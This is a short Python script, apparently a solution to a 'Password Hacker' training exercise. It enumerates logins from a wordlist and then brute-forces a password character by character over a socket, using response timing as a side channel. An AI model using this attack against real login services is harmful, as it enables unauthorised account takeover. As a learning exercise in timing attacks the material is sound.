import json
import socket
import sys
import itertools
from datetime import datetime
from _collections import defaultdict, OrderedDict


def connect_server(log, pas, sock):
    # print("Trying to connect with: ", log, pas)
    sock.send(json.dumps({"login": log, "password": pas}).encode())
    answer = json.loads(sock.recv(1024).decode())
    # print("The answer is: ", answer)
    return answer


def calculate_login(sock):
    possible_logins = defaultdict(int)
    for a in open('C:\\Users\\Ivan\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt',
                  'r'):
        test_login = a.strip()
        start = datetime.now()
        answer = connect_server(test_login, "", sock)
        finish = datetime.now()
        possible_logins[test_login] = (finish - start).microseconds
    v = list(possible_logins.values())
    k = list(possible_logins.keys())
    return k[v.index(max(v))]


def give_me_a_symbol():
    i = 0
    options = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    while True:
        yield options[i % len(options)]
        i += 1


def calculate_password(correct_login, sock):
    answer = {'result': None}
    current_password = ""
    gen = give_me_a_symbol()
    while True:
        possible_passwords = defaultdict(int)
        for _ in range(62):
            current_password += next(gen)
            start = datetime.now()
            answer = connect_server(correct_login, current_password, sock)
            if answer['result'] == "Connection success!":
                return current_password
            finish = datetime.now()
            possible_passwords[current_password] = (finish - start).microseconds
            current_password = current_password[:-1]
        v = list(possible_passwords.values())
        k = list(possible_passwords.keys())
        current_password = k[v.index(max(v))]
        # print(possible_passwords)


task = sys.argv
host = task[1]
port = int(task[2])

with socket.socket() as s:
    s.connect((host, port))
    login = calculate_login(s)
    password = calculate_password(login, s)
    my_answer = {"login": login, "password": password}
    print(json.dumps(my_answer))
